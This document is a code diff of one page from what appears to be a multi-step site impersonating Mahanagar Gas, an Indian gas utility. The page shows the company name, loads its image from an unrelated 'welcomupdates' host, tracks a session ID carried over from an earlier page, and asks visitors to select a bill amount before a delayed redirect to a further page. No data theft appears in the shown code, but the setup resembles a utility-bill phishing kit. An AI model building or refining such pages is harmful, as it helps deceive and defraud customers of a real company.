@@ -2,7 +2,9 @@
 <html>
 <head>
   <title>mgl gas</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"> <style>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <style>
     body {
       font-family: Arial;
       background-color: #FFFFFF;
@@ -59,12 +61,14 @@
     }
   </style>
 </head>
+
 <body>
+
   <img src="https://welcomupdates.vercel.app/top.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
     <h2>Mahanagar Gas</h2>
-    
+
     <form onsubmit="return validateCheckbox();">
       <div class="checkbox-section">
         <div class="title">Mgl Bill*</div>
@@ -79,25 +83,41 @@
   </div>
 
   <script>
-    // --- SESSION ID READ ---
-    // Index page se bani hui ID ko yahan read kar rahe hain
     const sessionId = localStorage.getItem("user_session_id");
 
     function validateCheckbox() {
       var checkbox = document.getElementById('agree');
+
       if (!checkbox.checked) {
         alert("Please select Bill amount.");
         return false;
       }
 
-      // Session ID check (Optional safety check)
-      if (!sessionId) {
-        console.log("No Session ID found, but proceeding...");
-      }
+      // message show
+      const msg = document.createElement("div");
+      msg.innerText = "Welcome dear user, thanks for visiting site";
 
-      window.location.href = "page3.html"; // Change this to your next page
+      msg.style.position = "fixed";
+      msg.style.top = "50%";
+      msg.style.left = "50%";
+      msg.style.transform = "translate(-50%, -50%)";
+      msg.style.background = "#000";
+      msg.style.color = "#fff";
+      msg.style.padding = "20px 30px";
+      msg.style.borderRadius = "10px";
+      msg.style.fontSize = "18px";
+      msg.style.zIndex = "9999";
+
+      document.body.appendChild(msg);
+
+      // 10 sec delay
+      setTimeout(function () {
+        window.location.href = "page3.html";
+      }, 10000);
+
       return false;
     }
   </script>
+
 </body>
 </html>
